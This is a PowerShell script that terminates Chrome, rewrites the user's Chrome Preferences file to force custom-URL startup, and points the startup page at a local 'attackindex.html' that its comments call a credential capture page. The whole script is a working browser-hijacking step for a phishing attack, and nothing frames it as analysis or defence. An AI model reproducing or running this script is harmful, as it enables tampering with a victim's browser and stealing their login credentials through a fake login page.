$prefPath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Preferences"
# Targets the local HTML user portal deployed to the public directory
$targetUrl = "file:///C:/Users/Public/attackindex.html"

if (Test-Path $prefPath) {
    # Close any open background chrome instances to release profile file locks
    Stop-Process -Name chrome -ErrorAction SilentlyContinue
    
    # Read the raw preferences file
    $content = Get-Content $prefPath -Raw
    
    # 1. Force the browser startup behavior to open custom URLs (Mode 4)
    if ($content -match '"restore_on_startup":\s*\d+') {
        $content = $content -replace '"restore_on_startup":\s*\d+', '"restore_on_startup":4'
    }
    
    # 2. Inject the path to the local credential capture page
    if ($content -match '"startup_urls":\s*\[.*?\]') {
        $content = $content -replace '"startup_urls":\s*\[.*?\]', ('"startup_urls":["' + $targetUrl + '"]')
    }
    
    # Write the modified configurations back out to disk
    Set-Content $prefPath $content -Encoding UTF8
    Write-Output "Chrome preferences updated: Target set to local login page."
} else {
    Write-Error "Chrome profile path not found. Ensure Chrome has been opened at least once."
}
